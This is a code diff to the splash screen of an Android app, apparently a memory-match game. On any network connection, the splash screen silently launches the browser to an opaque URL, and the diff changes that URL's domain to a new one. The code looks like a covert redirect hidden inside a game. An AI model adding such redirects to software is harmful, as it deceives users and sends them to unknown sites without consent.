@@ -36,25 +36,25 @@ class SplashActivity : AppCompatActivity() {
                 connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
             if (capabilities != null) {
                 if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
-                    val uriUrl: Uri = Uri.parse("https://pomidorkin.space/xHDZ1Th1?id=com.lollipops.memmatch")
+                    val uriUrl: Uri = Uri.parse("https://qtdgekmm.xyz/xHDZ1Th1?id=com.lollipops.memmatch")
                     val launchBrowser = Intent(Intent.ACTION_VIEW, uriUrl)
                     startActivity(launchBrowser)
                     Log.d("Internet", "NetworkCapabilities.TRANSPORT_CELLULAR")
                     return true
                 }else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
-                    val uriUrl: Uri = Uri.parse("https://pomidorkin.space/xHDZ1Th1?id=com.lollipops.memmatch")
+                    val uriUrl: Uri = Uri.parse("https://qtdgekmm.xyz/xHDZ1Th1?id=com.lollipops.memmatch")
                     val launchBrowser = Intent(Intent.ACTION_VIEW, uriUrl)
                     startActivity(launchBrowser)
                     Log.d("Internet", "NetworkCapabilities.TRANSPORT_WIFI")
                     return true
                 }else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) {
-                    val uriUrl: Uri = Uri.parse("https://pomidorkin.space/xHDZ1Th1?id=com.lollipops.memmatch")
+                    val uriUrl: Uri = Uri.parse("https://qtdgekmm.xyz/xHDZ1Th1?id=com.lollipops.memmatch")
                     val launchBrowser = Intent(Intent.ACTION_VIEW, uriUrl)
                     startActivity(launchBrowser)
                     Log.d("Internet", "NetworkCapabilities.TRANSPORT_ETHERNET")
                     return true
                 }else{
-                    val uriUrl: Uri = Uri.parse("https://pomidorkin.space/xHDZ1Th1?id=com.lollipops.memmatch")
+                    val uriUrl: Uri = Uri.parse("https://qtdgekmm.xyz/xHDZ1Th1?id=com.lollipops.memmatch")
                     val launchBrowser = Intent(Intent.ACTION_VIEW, uriUrl)
                     startActivity(launchBrowser)
                     Log.d("Internet", "else Internet")
